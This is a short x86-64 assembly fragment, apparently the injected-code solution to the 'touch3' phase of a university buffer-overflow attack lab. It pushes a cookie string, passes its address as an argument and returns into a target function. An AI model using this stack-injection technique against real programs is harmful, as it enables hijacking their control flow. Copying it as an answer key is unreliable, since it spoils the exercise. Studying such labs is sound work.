	sub $0x1000,%rsp
	pushq $0 # push \0
	#	movq $0x3539623939376661,%r10
	movq $0x6166373939623935,%r10
	pushq %r10# push cookie
	mov %rsp, %rdi #set string address as argument
	add $0x1010,%rsp
	pushq $0x4018fa # push touch3 enter address
ret
